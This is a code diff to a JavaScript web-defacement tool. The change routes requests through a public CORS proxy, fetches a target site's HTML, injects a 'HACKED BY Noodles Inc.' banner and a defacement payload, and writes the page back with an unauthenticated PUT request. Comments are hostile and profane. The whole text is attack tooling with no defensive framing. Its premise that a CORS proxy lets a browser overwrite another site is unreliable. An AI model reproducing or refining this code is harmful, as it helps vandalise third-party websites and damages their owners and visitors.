@@ -34,6 +34,25 @@
  };
  
 
+ // Function to fetch content with CORS bypass
+ async function fetchWithCORS(url) {
+  const corsProxy = 'https://corsproxy.io/?'; // Using corsproxy.io
+  const proxiedUrl = corsProxy + encodeURIComponent(url);
+ 
+
+  try {
+  const response = await fetch(proxiedUrl);
+  if (!response.ok) {
+  throw new Error(`HTTP error! Status: ${response.status}`);
+  }
+  return await response.text();
+  } catch (error) {
+  console.error("Error fetching with CORS bypass:", error);
+  throw error;
+  }
+ }
+ 
+
  // Defacement function
  document.getElementById("defaceButton").addEventListener("click", async function() {
   const targetURL = document.getElementById("targetURL").value;
@@ -54,10 +73,7 @@
   try {
   // Backup functionality (REAL - Grab that shit before you wreck it)
   logAction("Backing up website content...");
-  const backupResponse = await fetch(targetURL, {
-  mode: 'cors' // Attempt to bypass CORS limitations
-  });
-  const backupContent = await backupResponse.text();
+  const backupContent = await fetchWithCORS(targetURL);
   const backupBlob = new Blob([backupContent], { type: "text/html" });
   const backupLink = document.createElement("a");
   backupLink.href = URL.createObjectURL(backupBlob);
@@ -76,47 +92,29 @@
   logAction("Defacing website...");
  
 
-  // Attempt to deface, bypassing CORS limitations (REAL - Let the fun begin!)
-  fetch(targetURL, {
-  method: 'GET',
-  mode: 'cors' // Attempt to bypass CORS limitations
-  })
-  .then(response => response.text())
-  .then(data => {
-  const modifiedContent = data.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
+  const originalContent = await fetchWithCORS(targetURL);
+  const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
+  
+  // Use a proxy to bypass CORS for PUT requests
+  const corsProxy = 'https://corsproxy.io/?';
+  const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
  
 
-  // Send the modified content back to the server using a PUT request
-  return fetch(targetURL, {
+  const response = await fetch(proxiedUrl, {
   method: 'PUT',
   headers: {
-  'Content-Type': 'text/html'
+  'Content-Type': 'text/html',
   },
-  mode: 'cors', // Attempt to bypass CORS limitations
-  body: modifiedContent
+  body: modifiedContent,
   });
-  })
-  .then(response => {
-  // Check if the PUT request was successful (status 200)
+ 
+
   if (!response.ok) {
   throw new Error(`HTTP error! Status: ${response.status}`);
   }
  
 
-  // Log success or failure
   logAction('Defacement successful!');
-  })
-  .catch(error => {
-  // Log any errors
-  logAction(`Error: ${error}`);
-  console.error('Error:', error);
-  });
- 
-
-  // Log action
-  logAction("Defacement attempted for " + targetURL);
- 
-
   } catch (error) {
   console.error("Error:", error);
   alert("Something went wrong. Check the console, DIPSHIT.");
@@ -138,17 +136,24 @@
   logAction("Attempting to restore website...");
   const backupResponse = await fetch(backupURL);
   const backupContent = await backupResponse.text();
+  
+  // Use a proxy to bypass CORS for PUT requests
+  const corsProxy = 'https://corsproxy.io/?';
+  const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
  
 
-  // Send the backup content back to the server using a PUT request
-  await fetch(targetURL, {
+  const response = await fetch(proxiedUrl, {
   method: 'PUT',
   headers: {
-  'Content-Type': 'text/html'
+  'Content-Type': 'text/html',
   },
-  mode: 'cors' // Attempt to bypass CORS limitations
-  body: backupContent
+  body: backupContent,
   });
+ 
+
+  if (!response.ok) {
+  throw new Error(`HTTP error! Status: ${response.status}`);
+  }
  
 
   logAction("Website restoration completed for: " + targetURL);
